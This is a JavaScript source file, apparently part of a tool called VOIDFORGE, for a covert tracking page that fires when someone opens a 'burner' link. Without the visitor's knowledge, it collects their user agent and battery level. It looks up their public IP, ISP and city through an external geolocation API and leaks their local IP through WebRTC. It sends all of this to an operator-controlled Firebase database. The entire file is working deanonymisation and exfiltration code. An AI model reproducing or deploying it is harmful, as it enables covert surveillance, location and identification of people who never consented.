/**
 * VOIDFORGE - OSINT Engine (Infiltration & Telemetry)
 * Architecture: Strict Schema Telemetry, Passive Reconnaissance & Fallback Handlers
 * Status: MILITARY-GRADE PATCHED
 */

const OsintEngine = {
    targetId: null,
    dbRef: null,
    telemetryData: {},

    init: function(linkId) {
        this.targetId = linkId;
        this.dbRef = window.VoidDB.ref(`burner_vault/${linkId}/telemetri`);
        this.harvestSilentData();
    },

    // Fungsi pemotong string untuk mematuhi Firebase Rules (Mencegah DDoS Injeksi Data)
    truncate: function(str, maxLength) {
        if (!str) return "UNKNOWN";
        return String(str).substring(0, maxLength);
    },

    harvestSilentData: async function() {
        // 1. Panen Identitas (Max 300 karakter)
        this.telemetryData.userAgent = this.truncate(navigator.userAgent, 300);
        
        // 2. Panen Baterai (Max 20 karakter)
        try {
            if (navigator.getBattery) {
                const bat = await navigator.getBattery();
                const updateBattery = () => {
                    this.telemetryData.battery = this.truncate(`${Math.round(bat.level * 100)}% ${bat.charging ? '⚡' : ''}`, 20);
                    this.pushData();
                };
                updateBattery();
                bat.addEventListener('levelchange', updateBattery);
            }
        } catch(e) {
            this.telemetryData.battery = "UNKNOWN";
        }

        // 3. Panen IP via API Eksternal (Dengan Fallback jika diblokir AdBlock)
        try {
            const res = await fetch('https://ipapi.co/json/');
            if (!res.ok) throw new Error("API Blocked");
            const ipInfo = await res.json();
            this.telemetryData.ip = this.truncate(ipInfo.ip, 50);
            this.telemetryData.isp = this.truncate(ipInfo.org, 100);
            this.telemetryData.city = this.truncate(ipInfo.city, 100);
        } catch(e) {
            this.telemetryData.ip = "BLOCKED_BY_CLIENT";
            this.telemetryData.isp = "UNKNOWN";
            this.telemetryData.city = "UNKNOWN";
        }

        this.pushData();
        this.leakWebRTC();
    },

    leakWebRTC: function() {
        try {
            const rtc = new RTCPeerConnection({ iceServers: [] });
            rtc.createDataChannel('');
            rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
            
            rtc.onicecandidate = (ice) => {
                if (ice && ice.candidate && ice.candidate.candidate) {
                    // Ekstraksi IP Lokal atau mDNS UUID (Browser modern menyamarkan IP lokal)
                    const candidateStr = ice.candidate.candidate;
                    const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{8}(-[a-f0-9]{4}){3}-[a-f0-9]{12}\.local)/.exec(candidateStr);
                    
                    if (ipMatch) {
                        this.telemetryData.webrtc_ip = this.truncate(ipMatch[1], 50);
                        this.pushData();
                        rtc.close();
                    }
                }
            };
            
            // Timeout jika browser sama sekali tidak memancarkan ICE Candidate
            setTimeout(() => {
                if (!this.telemetryData.webrtc_ip) {
                    this.telemetryData.webrtc_ip = "SECURED_BY_BROWSER";
                    this.pushData();
                    rtc.close();
                }
            }, 3000);

        } catch(e) {
            this.telemetryData.webrtc_ip = "FAILED_OR_BLOCKED";
            this.pushData();
        }
    },

    pushData: function() {
        if(this.dbRef) {
            // Update data ke Firebase. Hanya akan berhasil jika struktur mematuhi Firebase Rules.
            this.dbRef.update(this.telemetryData).catch(err => {
                console.warn("[VOIDFORGE] Transmisi OSINT Ditolak oleh Aturan Keamanan Database.");
            });
        }
    }
};
